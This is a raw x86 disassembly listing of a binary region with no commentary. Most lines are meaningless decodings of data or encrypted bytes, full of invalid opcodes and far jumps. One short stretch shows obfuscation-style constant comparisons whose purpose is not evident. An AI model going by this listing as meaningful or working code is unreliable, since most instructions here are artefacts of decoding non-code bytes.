  41dfb8:	fs xchg edx,eax
  41dfba:	jbe    0x41dfb5
  41dfbc:	sbb    BYTE PTR [ebx+0x4e],ah
  41dfbf:	mov    DWORD PTR [ecx+eiz*1-0x1a],esi
  41dfc3:	cmp    ch,bl
  41dfc5:	jo     0x41df50
  41dfc7:	mov    WORD PTR [esi],?
  41dfc9:	das    
  41dfca:	fs nop
  41dfcc:	loop   0x41e03c
  41dfce:	sbb    eax,0x83504df
  41dfd3:	jmp    0xdfcd:0x262ae839
  41dfda:	and    DWORD PTR [edx+0x78e9b5f1],ecx
  41dfe0:	loopne 0x41e056
  41dfe2:	push   ds
  41dfe3:	jl     0x41df94
  41dfe5:	(bad)  
  41dfe6:	in     al,dx
  41dfe7:	ss in  al,dx
  41dfe9:	call   0x7507:0x402a8117
  41dff0:	mov    al,0x9b
  41dff2:	push   ecx
  41dff3:	mov    esp,edx
  41dff5:	int    0x49
  41dff7:	(bad)  
  41dff8:	jns    0x41e043
  41dffa:	sub    DWORD PTR [ebx],edi
  41dffc:	cwde   
  41dffd:	aaa    
  41dffe:	xchg   ecx,eax
  41dfff:	cmp    eax,0x5bfcc93c
  41e004:	cmp    BYTE PTR [esi],dh
  41e006:	mov    edi,0xecf7e3a7
  41e00b:	mov    ah,0x80
  41e00d:	push   ebp
  41e00e:	pop    ecx
  41e00f:	and    eax,0x5a678057
  41e014:	lock jle 0x41dfa5
  41e017:	outs   dx,DWORD PTR ds:[esi]
  41e018:	mov    BYTE PTR [eax+0x3250ad5c],dl
  41e01e:	push   ebp
  41e01f:	or     esp,DWORD PTR [eax-0x68]
  41e022:	imul   ecx,DWORD PTR [ebx+0x2a],0xffffffc8
  41e026:	mov    ds:0x6b2faa3d,al
  41e02b:	div    ch
  41e02d:	xor    al,0x9e
  41e02f:	xor    eax,0x19c1304a
  41e034:	mov    al,ds:0x4f23fd6f
  41e039:	and    ch,ah
  41e03b:	push   ebp
  41e03c:	adc    cl,BYTE PTR [edi]
  41e03e:	inc    ecx
  41e03f:	leave  
  41e040:	add    al,al
  41e042:	scas   al,BYTE PTR es:[edi]
  41e043:	je     0x41e018
  41e045:	mov    al,ds:0xc9a2fe4e
  41e04a:	pop    es
  41e04b:	mov    eax,ds:0x86801724
  41e050:	xchg   ecx,eax
  41e051:	cmp    al,0xc8
  41e053:	mov    ch,0x7f
  41e055:	ja     0x41e0ba
  41e057:	jbe    0x41e08b
  41e059:	daa    
  41e05a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e05b:	lods   al,BYTE PTR ds:[esi]
  41e05c:	(bad)  
  41e05d:	push   edi
  41e05e:	mov    ebx,0x9404c3cd
  41e063:	mov    ebp,0x2a5900cf
  41e068:	les    ebx,FWORD PTR [eax-0x205a4da3]
  41e06e:	jmp    FWORD PTR [esi+0x79]
  41e071:	cdq    
  41e072:	js     0x41e005
  41e074:	ret    0x3de4
  41e077:	push   ebp
  41e078:	fbstp  TBYTE PTR [ebp-0x3]
  41e07b:	pop    ecx
  41e07c:	(bad)  
  41e07d:	jnp    0x41e0f4
  41e07f:	ins    BYTE PTR es:[edi],dx
  41e080:	mov    esp,0xbdfb1d2d
  41e085:	test   al,0x7e
  41e087:	mov    al,ds:0xdeb5acfd
  41e08c:	or     dl,BYTE PTR [esi+eax*1]
  41e08f:	xchg   edx,eax
  41e090:	xor    cl,dh
  41e092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e093:	mov    ebx,0x60a8fa93
  41e098:	adc    DWORD PTR [eax+0x22],esi
  41e09b:	push   esi
  41e09c:	xchg   ecx,eax
  41e09d:	cs retf 0x1d62
  41e0a1:	ret    0x19a5
  41e0a4:	fwait
  41e0a5:	ret    
  41e0a6:	inc    eax
  41e0a7:	cmp    al,0xe7
  41e0a9:	mov    al,0xb3
  41e0ab:	fwait
  41e0ac:	and    eax,DWORD PTR [esi+edx*1]
  41e0af:	jae    0x41e099
  41e0b1:	bnd jmp 0x6b8bb444
  41e0b7:	sti    
  41e0b8:	lahf   
  41e0b9:	lea    ebx,[ebx-0x61d449a4]
  41e0bf:	sub    esp,DWORD PTR [edi-0x44]
  41e0c2:	push   ecx
  41e0c3:	jmp    0x4bd3:0x3e012340
  41e0ca:	enter  0xa89,0xc5
  41e0ce:	daa    
  41e0cf:	out    0x1f,eax
  41e0d1:	xchg   DWORD PTR fs:[edx-0x1c],esp
  41e0d5:	mov    BYTE PTR ds:0x98185822,cl
  41e0db:	fsubrp st(6),st
  41e0dd:	(bad)  
  41e0de:	jecxz  0x41e0fa
  41e0e0:	sbb    DWORD PTR ss:[ebp-0x15],esi
  41e0e4:	dec    ebx
  41e0e5:	or     BYTE PTR [ebp-0x577f8a55],ah
  41e0eb:	enter  0xb98,0xb1
  41e0ef:	add    ebx,DWORD PTR [ebp-0x272559f7]
  41e0f5:	fld    st(5)
  41e0f7:	mov    al,ds:0x2c77a9b9
  41e0fc:	lea    esp,[ebx]
  41e0fe:	clc    
  41e0ff:	sub    al,0x77
  41e101:	lock fs aam 0xe8
  41e105:	dec    ebx
  41e106:	imul   BYTE PTR [edx+0x4b]
  41e109:	sbb    BYTE PTR [eax-0x2e5d9790],bh
  41e10f:	in     al,0xef
  41e111:	icebp  
  41e112:	pop    DWORD PTR [edi+edi*1]
  41e115:	jg     0x41e0b7
  41e117:	push   ds
  41e118:	mov    DWORD PTR [esp+0x10],0x421a
  41e120:	mov    eax,DWORD PTR [esp+0x10]
  41e124:	and    eax,0xffffc244
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	(bad)  
  41e1f2:	sbb    edi,edx
  41e1f4:	mov    esp,0x18163fc6
  41e1f9:	mov    esp,0x8181812
  41e1fe:	loopne 0x41e219
  41e200:	loope  0x41e183
  41e202:	sub    DWORD PTR [edx+ebp*8],eax
  41e205:	cmp    DWORD PTR es:[ecx-0x21],edi
  41e209:	dec    ebp
  41e20a:	out    dx,al
  41e20b:	mov    esp,0xeb0268d7
  41e210:	fs stc 
  41e212:	(bad)  
  41e213:	mov    DWORD PTR ds:0x2bfd3ca9,ebp
  41e219:	or     eax,0x1f6b55f5
  41e21e:	loope  0x41e1fe
  41e220:	xor    bl,BYTE PTR [edx]
  41e222:	inc    edi
  41e223:	ja     0x41e1de
  41e225:	sbb    edx,eax
  41e227:	setge  dl
  41e22a:	ins    BYTE PTR es:[edi],dx
  41e22b:	jg     0x41e1b7
  41e22d:	or     al,0x94
  41e22f:	jp     0x41e296
  41e231:	lds    eax,FWORD PTR [ebx-0x2c92f88e]
  41e237:	sbb    bh,BYTE PTR [ebx-0x50]
  41e23a:	ins    BYTE PTR es:[edi],dx
  41e23b:	es scas eax,DWORD PTR es:[edi]
  41e23d:	push   ebp
  41e23e:	sbb    ah,BYTE PTR [edi-0x5b]
  41e241:	repz or DWORD PTR [edx-0xe],0xffffffe3
  41e246:	mov    dl,0xca
  41e248:	bound  edi,QWORD PTR [esi-0x1a]
  41e24b:	adc    BYTE PTR [edi-0x381111d],ah
  41e251:	xchg   edi,eax
  41e252:	sub    BYTE PTR [eax],cl
  41e254:	and    ebp,ebp
  41e256:	cmc    
  41e257:	sbb    al,0xef
  41e259:	mov    ah,BYTE PTR [esp+edx*2-0x2126bd65]
  41e260:	mov    ecx,0xe8556260
  41e265:	icebp  
  41e266:	jp     0x41e2c7
  41e268:	add    eax,esi
  41e26a:	mov    ds:0x70836d2,eax
  41e26f:	pusha  
  41e270:	sar    BYTE PTR [ecx-0x3e],1
  41e273:	jmp    0xf01ad1ad
  41e278:	mov    ch,0x69
  41e27a:	xchg   BYTE PTR [ecx+eiz*2+0x5204cfcc],bh
  41e281:	jle    0x41e2f8
  41e283:	pop    edx
  41e284:	push   edx
  41e285:	lods   al,BYTE PTR ds:[esi]
  41e286:	hlt    
  41e287:	adc    ecx,ebp
  41e289:	cmp    edi,ecx
  41e28b:	ins    BYTE PTR es:[edi],dx
  41e28c:	dec    edx
  41e28d:	jg     0x41e253
  41e28f:	fcom   st(6)
  41e291:	test   DWORD PTR [esi+0x4d],0x5e3f4332
  41e298:	jo     0x41e2ba
  41e29a:	shl    DWORD PTR ds:0xd8daf849,1
  41e2a0:	xor    al,0xdb
  41e2a2:	test   eax,0xcb5c117f
  41e2a7:	pop    ebx
  41e2a8:	mov    esp,0xc8cb963f
  41e2ad:	mov    ds:0xc1ea43d6,eax
  41e2b2:	int    0x74
  41e2b4:	or     al,0x4
  41e2b6:	or     DWORD PTR [ecx+0x38f4af04],ebp
  41e2bc:	sbb    DWORD PTR [ebx-0x26],esp
  41e2bf:	setp   BYTE PTR [edx-0x29c8d8df]
  41e2c6:	sub    BYTE PTR [ebp+0x421c22c2],bl
  41e2cc:	stc    
  41e2cd:	jbe    0x41e2c1
  41e2cf:	sub    DWORD PTR [ebp-0x6f],edx
  41e2d2:	sti    
  41e2d3:	icebp  
  41e2d4:	daa    
  41e2d5:	out    0x8e,eax
  41e2d7:	adc    BYTE PTR [esi+0x2c],bh
  41e2da:	mov    BYTE PTR [ebx],bl
  41e2dc:	dec    ebx
  41e2dd:	lock imul ebp,DWORD PTR [esi],0x810c74ed
  41e2e4:	mov    esi,0x5d9ea351
  41e2e9:	xchg   DWORD PTR [ebx],edi
  41e2eb:	rcr    DWORD PTR [ecx-0xfdd493d],1
  41e2f1:	test   al,0x6c
  41e2f3:	or     esi,edx
  41e2f5:	mov    al,ds:0x94922a4b
  41e2fa:	ins    BYTE PTR es:[edi],dx
  41e2fb:	cdq    
  41e2fc:	xchg   esi,eax
  41e2fd:	lods   eax,DWORD PTR ds:[esi]
  41e2ff:	xchg   esp,eax
  41e300:	nop
  41e301:	sub    DWORD PTR [ecx-0x2ee1206f],esp
  41e307:	push   edx
  41e308:	ss nop
  41e30a:	sahf   
  41e30b:	pop    edi
  41e30c:	fucomip st,st(0)
  41e30e:	dec    ebp
  41e30f:	retf   
  41e310:	or     DWORD PTR [esi-0x35],edx
  41e313:	sub    ecx,ebp
  41e315:	mov    eax,ds:0xbf3d74a2
  41e31a:	fisttp WORD PTR [esi+0x7b4bad91]
  41e320:	jecxz  0x41e2a6
  41e322:	leave  
  41e323:	cmp    eax,0x5e76fcf0
  41e328:	loopne 0x41e396
  41e32a:	dec    edi
  41e32b:	dec    ecx
  41e32c:	push   ds
  41e32d:	sbb    DWORD PTR [edx],ebp
  41e32f:	mov    dl,0x41
  41e331:	and    BYTE PTR [ebp-0x6f],dl
  41e334:	dec    ebx
  41e335:	mov    ebp,0xff57fb9
  41e33a:	push   ecx
  41e33b:	sbb    eax,0x4107309b
  41e340:	stos   BYTE PTR es:[edi],al
  41e341:	repnz retf 
  41e343:	mov    al,ds:0xe6a2dd12
  41e348:	in     eax,dx
  41e349:	arpl   WORD PTR [esi+0x5e],bp
  41e34c:	fs push 0xc9f22b61
  41e352:	(bad)  
  41e353:	mov    ds:0xadacfd93,eax
  41e358:	out    dx,al
  41e359:	cld    
  41e35a:	shl    DWORD PTR [edx],cl
  41e35c:	in     eax,0xc2
  41e35e:	fistp  DWORD PTR [esi*1-0x75e255f8]
  41e365:	jmp    0xbf6a896a
  41e36a:	xor    eax,0x4f7d0b5d
  41e36f:	xlat   BYTE PTR ds:[ebx]
  41e370:	add    al,BYTE PTR [ebx-0x48bfd65d]
  41e376:	sar    BYTE PTR [edx-0x10ef18e8],1
  41e37c:	sti    
  41e37d:	fcom   DWORD PTR [ecx+0x2fc9d9e5]
  41e383:	stc    
  41e384:	lds    edx,FWORD PTR [eax]
  41e386:	xchg   ebp,eax
  41e387:	stos   BYTE PTR es:[edi],al
  41e388:	dec    ecx
  41e389:	ins    DWORD PTR es:[edi],dx
  41e38a:	scas   eax,DWORD PTR es:[edi]
  41e38b:	in     al,dx
  41e38c:	push   ss
  41e38d:	mov    cl,0x29
  41e38f:	xchg   esi,eax
  41e390:	fld    QWORD PTR [ecx-0x73]
  41e393:	fs push edi
  41e395:	push   0xd
  41e397:	mov    ecx,0xc9506a08
  41e39c:	test   BYTE PTR [ecx+0x6c5bf052],al
  41e3a2:	int3   
  41e3a3:	enter  0x1275,0x5f
  41e3a7:	fstp   QWORD PTR [ecx]
  41e3a9:	ror    DWORD PTR [edi],0x87
  41e3ac:	das    
  41e3ad:	in     al,dx
  41e3ae:	aam    0xdb
  41e3b0:	ds mov bl,0x5b
  41e3b3:	sbb    al,0x77
  41e3b5:	mov    ebp,0xf37c9615
  41e3ba:	push   esi
  41e3bb:	mov    ds:0x15c5675a,al
  41e3c0:	lods   al,BYTE PTR ds:[esi]
  41e3c1:	lods   al,BYTE PTR ds:[esi]
  41e3c2:	xchg   edx,ebx
  41e3c4:	inc    eax
  41e3c5:	sub    ch,al
  41e3c7:	and    edx,DWORD PTR [ecx+0x6650a03]
  41e3cd:	mov    eax,ds:0x410af387
  41e3d2:	dec    edx
  41e3d3:	retf   0x4fbf
  41e3d6:	es pop edi
  41e3d8:	dec    edx
  41e3d9:	and    eax,0x8bffc960
  41e3de:	or     al,0x5
  41e3e0:	push   edi
  41e3e1:	jecxz  0x41e43b
  41e3e3:	sti    
  41e3e4:	pop    esp
  41e3e5:	xchg   ebp,eax
  41e3e6:	std    
  41e3e7:	mov    esi,0x64a1c965
  41e3ec:	addr16 inc ecx
  41e3ee:	push   es
  41e3ef:	push   es
  41e3f0:	push   0x43f8ff37
  41e3f5:	test   al,0x65
  41e3f7:	test   al,0x76
  41e3f9:	dec    ebp
  41e3fa:	jns    0x41e386
  41e3fc:	inc    eax
  41e3fd:	push   es
  41e3fe:	nop
  41e3ff:	inc    esp
  41e400:	dec    esp
  41e401:	enter  0xcf88,0x0
  41e405:	nop
  41e406:	lea    edx,[edi+0x21]
  41e409:	test   ch,al
  41e40b:	enter  0x9443,0x87
  41e40f:	and    ecx,0x6f65d027
  41e415:	sub    al,0xb6
  41e417:	sbb    eax,ebx
  41e419:	adc    edx,edx
  41e41b:	jp     0x41e3ae
  41e41d:	pop    ebx
  41e41e:	dec    edi
  41e41f:	push   esp
  41e420:	dec    esp
  41e421:	out    0xb8,al
  41e423:	adc    bl,0xfa
  41e426:	or     al,0xa2
  41e428:	shl    DWORD PTR [edi],cl
  41e42a:	dec    edx
  41e42b:	fcmovbe st,st(3)
  41e42d:	icebp  
  41e42e:	pop    ecx
  41e42f:	cmp    esp,DWORD PTR [ecx]
  41e431:	pop    ecx
  41e432:	fisub  WORD PTR [ecx-0x4fc11bb5]
  41e438:	test   eax,0x45aeb8e8
  41e43d:	imul   ebp,DWORD PTR [ebp+ebp*1-0x21ba0628],0x770471f9
  41e448:	pop    edi
  41e449:	push   ss
  41e44a:	pop    esp
  41e44b:	jo     0x41e3ea
  41e44d:	push   ebp
  41e44e:	xchg   esp,eax
  41e44f:	call   0x6b89:0x62eefa2c
  41e456:	data16 stc 
  41e458:	lea    ebp,[edx+eiz*2-0x4db99303]
  41e45f:	stos   DWORD PTR es:[edi],eax
  41e460:	push   0xe1dff0d7
  41e465:	jbe    0x41e460
  41e467:	sbb    bh,ah
  41e469:	fstp   QWORD PTR [eax+eiz*1+0x4a344660]
  41e470:	stc    
  41e471:	setns  BYTE PTR [edx+ebp*4+0x28]
  41e476:	cwde   
  41e477:	jmp    0xc52c:0x151d5f4d
  41e47e:	or     bl,cl
  41e480:	pop    ss
  41e481:	xor    DWORD PTR ds:[edx-0x3ce6a18e],0x93ebaf17
  41e48c:	push   esp
  41e48d:	xor    dh,ah
  41e48f:	cli    
  41e490:	aaa    
  41e491:	push   esi
  41e492:	mov    al,ds:0xf6c3007a
  41e497:	neg    BYTE PTR es:[eax]
  41e49a:	pop    edi
  41e49b:	cli    
  41e49c:	xchg   edi,eax
  41e49d:	out    0x4,al
  41e49f:	out    0x90,al
  41e4a1:	pop    ebx
  41e4a2:	jmp    0xd0be:0x7020cbae
  41e4a9:	mov    bh,0xc
  41e4ab:	rcr    edx,1
  41e4ad:	sub    eax,0xaf0841e8
  41e4b2:	sar    BYTE PTR [esi],0x19
  41e4b5:	mov    DWORD PTR [ebp+0x5699575f],eax
  41e4bb:	fisttp QWORD PTR [ecx+0x12]
  41e4be:	xlat   BYTE PTR ds:[ebx]
  41e4bf:	and    ebx,esp
  41e4c1:	sbb    esp,DWORD PTR [esi+0x65]
  41e4c4:	cwde   
  41e4c5:	out    dx,eax
  41e4c6:	fdivr  QWORD PTR [ebp-0x2f]
  41e4c9:	mov    ?,WORD PTR [ebp+0x21]
  41e4cc:	ja     0x41e4ed
  41e4ce:	sahf   
  41e4cf:	push   ebx
  41e4d0:	adc    al,0xed
  41e4d2:	cmp    BYTE PTR [edx-0x2d],cl
  41e4d5:	or     al,0x16
  41e4d7:	ss (bad) 
  41e4d9:	cdq    
  41e4da:	pop    ds
  41e4db:	sbb    DWORD PTR [edx],esp
  41e4dd:	pop    ecx
  41e4de:	inc    edx
  41e4df:	(bad)  
  41e4e0:	mov    edx,0x1e96ee6e
  41e4e5:	push   ds
  41e4e6:	pushf  
  41e4e7:	out    0xf5,eax
  41e4e9:	imul   esi,DWORD PTR [ecx+0x7e1823ae],0x216b58d5
  41e4f3:	cli    
  41e4f4:	sub    eax,DWORD PTR [ebx-0x427fb7cc]
  41e4fa:	test   al,0xa0
  41e4fc:	jo     0x41e51a
  41e4fe:	cwde   
  41e4ff:	fbld   TBYTE PTR [ebp-0xc]
  41e502:	loop   0x41e4af
  41e504:	ins    BYTE PTR es:[edi],dx
  41e505:	loop   0x41e543
  41e507:	retf   
  41e508:	std    
  41e509:	lock push cs
  41e50b:	inc    ebx
  41e50c:	fwait
  41e50d:	cmp    ah,cl
  41e50f:	push   edx
  41e510:	cmp    ah,BYTE PTR [edi-0x4f421e63]
  41e516:	xchg   ebx,eax
  41e517:	push   esp
  41e518:	mov    cl,BYTE PTR [esi+0x7b913639]
  41e51e:	sbb    esp,ebx
  41e520:	inc    ecx
  41e521:	jnp    0x41e4b9
  41e523:	pop    esi
  41e524:	jge    0x41e55f
  41e526:	dec    ebp
  41e527:	es ins BYTE PTR es:[edi],dx
  41e529:	jae    0x41e578
  41e52b:	mov    ds:0xb660f19f,al
  41e530:	mov    dl,bh
  41e532:	mov    bl,BYTE PTR [esi+0x10]
  41e535:	pusha  
  41e536:	hlt    
  41e537:	xchg   edi,eax
  41e538:	sbb    BYTE PTR [esi],dh
  41e53a:	inc    edi
  41e53b:	pop    ds
  41e53c:	daa    
  41e53d:	push   edi
  41e53e:	(bad)
  41e541:	or     al,0x46
  41e543:	push   eax
  41e544:	add    BYTE PTR [ebp-0x26],0xce
  41e548:	jp     0x41e51e
  41e54a:	mov    edi,0x7de758d
  41e54f:	leave  
  41e550:	test   DWORD PTR ds:0x80cd9664,0x9346d221
  41e55a:	fwait
  41e55b:	dec    esi
  41e55c:	mov    ch,0xbc
  41e55e:	sahf   
  41e55f:	xor    ah,BYTE PTR [eax+0x6b]
  41e562:	leave  
  41e563:	jge    0x41e561
  41e565:	xchg   edi,eax
  41e566:	outs   dx,DWORD PTR ds:[esi]
  41e567:	add    ebx,DWORD PTR [ecx+0x1e]
  41e56a:	inc    edx
  41e56b:	dec    eax
  41e56c:	inc    ebp
  41e56d:	aam    0x39
  41e56f:	xor    bh,BYTE PTR [ebp-0x2b]
  41e572:	mov    ecx,0xc68619a9
  41e577:	sti    
  41e578:	and    al,0x60
  41e57a:	(bad)  
  41e57b:	shl    BYTE PTR [edx],cl
  41e57d:	and    eax,0xbed69050
  41e582:	lds    ebp,FWORD PTR [ebx+0x47]
  41e585:	cmp    BYTE PTR [eax],bl
  41e587:	nop
  41e588:	std    
  41e589:	or     dh,0x75
  41e58c:	rol    DWORD PTR [edx+0xcb6da24],cl
  41e592:	mov    ebp,DWORD PTR [edx+0xce245b9]
  41e598:	push   ecx
  41e599:	(bad)  
  41e59b:	not    ah
  41e59d:	mov    edi,0xf7922361
  41e5a2:	das    
  41e5a3:	test   DWORD PTR [ecx+0x632320d0],esp
  41e5a9:	call   0x10446b1
  41e5ae:	pop    esp
  41e5af:	shl    eax,0x2
  41e5b2:	or     eax,ecx
  41e5b4:	jmp    0x41e983
  41e5b9:	test   BYTE PTR [esi],cl
  41e5bb:	nop
  41e5bc:	lahf   
  41e5bd:	jp     0x41e5dd
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0x4eaae715
  41e5c6:	test   DWORD PTR [ebp-0x44],esp
  41e5c9:	imul   esi,DWORD PTR [edi],0x16
  41e5cc:	sbb    BYTE PTR [edx+edx*1-0x5156e7e8],bh
  41e5d3:	cmp    ebx,edi
  41e5d5:	xlat   BYTE PTR ds:[ebx]
  41e5d6:	div    BYTE PTR [edx+0x54]
  41e5d9:	jo     0x41e5f3
  41e5db:	or     DWORD PTR [esi],0xffffffb8
  41e5de:	mov    esi,0xdfa5fd19
  41e5e3:	jno    0x41e5a4
  41e5e5:	mov    ebx,edi
  41e5e7:	or     ebx,ebx
  41e5e9:	imul   esi,DWORD PTR [eax-0x13],0x66
  41e5ed:	dec    esp
  41e5ee:	push   edi
  41e5ef:	fist   WORD PTR [ebx]
  41e5f1:	std    
  41e5f2:	jmp    0x41e61b
  41e5f4:	data16 icebp 
  41e5f6:	jmp    0x53825313
  41e5fb:	mov    WORD PTR [esi],gs
  41e5fd:	add    DWORD PTR ds:0x6d5c7e76,0xffffff99
  41e604:	leave  
  41e605:	jae    0x41e5e4
  41e607:	mov    ah,0xc2
  41e609:	fdiv   DWORD PTR [esi-0x6689cf12]
  41e60f:	cli    
  41e610:	outs   dx,DWORD PTR ds:[esi]
  41e611:	add    BYTE PTR [edi],ah
  41e613:	sti    
  41e614:	xchg   esi,eax
  41e615:	adc    esp,DWORD PTR [edi+0x2f]
  41e618:	data16 jae 0x41e5f8
  41e61b:	das    
  41e61c:	lahf   
  41e61d:	nop
  41e61e:	jmp    0x41e600
  41e620:	dec    ebx
  41e621:	jae    0x41e641
  41e623:	fsubr  st(2),st
  41e625:	inc    edi
  41e626:	sub    cl,ch
  41e628:	push   ebp
  41e629:	rcl    BYTE PTR [eax+0x75],1
  41e62c:	xor    ebx,edx
  41e62e:	or     DWORD PTR [ecx],ebx
  41e630:	or     al,0xa2
  41e632:	sahf   
  41e633:	mov    bl,0xfd
  41e635:	push   0x1ad13590
  41e63a:	jge    0x41e5fc
  41e63c:	ss dec ecx
  41e63e:	xor    al,0x7
  41e640:	adc    ecx,edi
  41e642:	test   al,0xbf
  41e644:	mov    ebp,0x21627d62
  41e649:	mov    dh,0x81
  41e64b:	(bad)  
  41e64c:	lods   al,BYTE PTR ds:[esi]
  41e64d:	ins    BYTE PTR es:[edi],dx
  41e64e:	fnstcw WORD PTR [edi+0x5ae621da]
  41e654:	push   cs
  41e655:	pusha  
  41e656:	(bad)  
  41e657:	xchg   edi,eax
  41e658:	mov    al,ds:0x9a4d723b
  41e65d:	scas   eax,DWORD PTR es:[edi]
  41e65e:	out    0x6e,eax
  41e660:	jno    0x41e68c
  41e662:	jl     0x41e671
  41e664:	nop
  41e665:	jmp    0xfeb0b829
  41e66a:	js     0x41e61f
  41e66c:	and    eax,0x51cc93de
  41e671:	sbb    cl,BYTE PTR [ecx]
  41e673:	inc    edx
  41e674:	(bad)  
  41e675:	lods   al,BYTE PTR ds:[esi]
  41e676:	add    cl,BYTE PTR [ebp-0x71]
  41e679:	jo     0x41e625
  41e67b:	arpl   WORD PTR [eax-0xe],si
  41e67e:	sub    BYTE PTR [ebx+0x4c],ch
  41e681:	jge    0x41e693
  41e683:	or     DWORD PTR [edi-0x3be7b3ae],ebx
  41e689:	and    al,0xe3
  41e68b:	sbb    ecx,DWORD PTR [eax]
  41e68d:	iret   
  41e68e:	cmp    BYTE PTR [ebx+esi*2],ch
  41e691:	es and eax,0xac7554f8
  41e697:	cmp    al,0x6
  41e699:	jecxz  0x41e68f
  41e69b:	retf   
  41e69c:	xchg   edi,eax
  41e69d:	jb     0x41e69d
  41e69f:	inc    eax
  41e6a0:	and    ebp,DWORD PTR [ebx-0x44]
  41e6a3:	stos   BYTE PTR es:[edi],al
  41e6a4:	inc    edx
  41e6a5:	mov    ch,0xec
  41e6a7:	nop
  41e6a8:	or     al,0xe5
  41e6aa:	inc    edx
  41e6ab:	and    eax,0x65163597
  41e6b0:	lods   al,BYTE PTR ds:[esi]
  41e6b1:	inc    esp
  41e6b2:	fsubr  st(1),st
  41e6b4:	sbb    edx,DWORD PTR [eax]
  41e6b6:	jle    0x41e6c3
  41e6b8:	hlt    
  41e6b9:	push   0xfffffff0
  41e6bb:	jb     0x41e651
  41e6bd:	mov    ebp,DWORD PTR [edi+ebx*1-0x78b8f4e3]
  41e6c4:	mov    dh,BYTE PTR [edi+0x1af7a66e]
  41e6ca:	cld    
  41e6cb:	in     eax,dx
  41e6cc:	xor    BYTE PTR [edi+edx*8],0x3d
  41e6d0:	ja     0x41e716
  41e6d2:	and    BYTE PTR [ecx],dh
  41e6d4:	test   edx,ebx
  41e6d6:	xchg   ebp,eax
  41e6d7:	call   0x325a:0xc834180c
  41e6de:	xchg   esi,eax
  41e6df:	dec    edi
  41e6e0:	jae    0x41e6e8
  41e6e2:	out    dx,al
  41e6e3:	jge    0x41e6a3
  41e6e5:	retf   0x4ab5
  41e6e8:	mov    ah,0x31
  41e6ea:	jbe    0x41e692
  41e6ec:	sti    
  41e6ed:	daa    
  41e6ee:	xchg   esp,eax
  41e6ef:	cmp    BYTE PTR [ebp+0x30db1c94],dl
  41e6f5:	push   cs
  41e6f6:	mov    fs,edi
  41e6f8:	push   eax
  41e6f9:	fcom   DWORD PTR [ebx-0x3ff02c32]
  41e6ff:	sar    DWORD PTR [eax],0x25
  41e702:	fsubr  QWORD PTR [eax-0x5323af4b]
  41e708:	sahf   
  41e709:	sub    bh,al
  41e70b:	or     ah,BYTE PTR [ecx-0x4dc44d95]
  41e711:	(bad)  [edx]
  41e713:	sti    
  41e714:	pop    edx
  41e715:	xor    DWORD PTR [ebx+0x5667be06],0xffffffbd
  41e71c:	ret    
  41e71d:	mov    ebx,0x271201d5
  41e722:	mov    edx,0x730c6be5
  41e727:	addr16 pop ecx
  41e729:	push   ds
  41e72a:	pop    ss
  41e72b:	xchg   edx,eax
  41e72c:	push   eax
  41e72d:	in     eax,dx
  41e72e:	xchg   esp,eax
  41e72f:	xchg   DWORD PTR [bx+0x7ccb],edi
  41e734:	(bad)  
  41e735:	cli    
  41e736:	push   esp
  41e737:	loope  0x41e76b
  41e739:	jge    0x41e6f2
  41e73b:	pop    edx
  41e73c:	aas    
  41e73d:	cmp    eax,0xa625e33a
  41e742:	rol    BYTE PTR [eax+0xb],1
  41e745:	ds jbe 0x41e780
  41e748:	dec    eax
  41e749:	inc    DWORD PTR [ecx+edi*1+0x631ec434]
  41e750:	int3   
  41e751:	mov    ah,0xdc
  41e753:	std    
  41e754:	xlat   BYTE PTR ds:[ebx]
  41e755:	and    eax,0xf8455b42
  41e75a:	cmp    eax,esi
  41e75c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e75d:	push   esi
  41e75e:	adc    ebx,DWORD PTR [ebp+0x1c8b5f3b]
  41e764:	mov    ebp,0x1612466
  41e769:	jbe    0x41e76f
  41e76b:	jns    0x41e6fb
  41e76d:	pushf  
  41e76e:	push   esi
  41e76f:	jo     0x41e76b
  41e771:	and    DWORD PTR [edi+0x21347dbc],0xc72498ba
  41e77b:	mov    edx,0xe3547249
  41e780:	mov    al,ds:0x83af8362
  41e785:	pushf  
  41e786:	ins    BYTE PTR es:[edi],dx
